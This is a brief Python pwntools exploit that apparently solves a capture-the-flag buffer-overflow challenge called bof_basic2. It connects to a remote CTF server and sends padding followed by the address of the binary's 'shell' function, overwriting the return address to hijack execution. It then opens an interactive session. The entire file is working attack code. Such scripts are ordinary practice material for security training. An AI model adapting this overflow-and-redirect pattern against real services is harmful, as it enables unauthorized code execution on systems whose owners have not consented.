#!/usr/bin/python 
from pwn import *

#p = process("./bof_basic2")
p = remote("ctf.j0n9hyun.xyz", 3001)
elf = ELF("./bof_basic2")
shell = elf.symbols['shell']

p.sendline('A'*(0x8c-0xc) + p32(shell))

p.interactive()
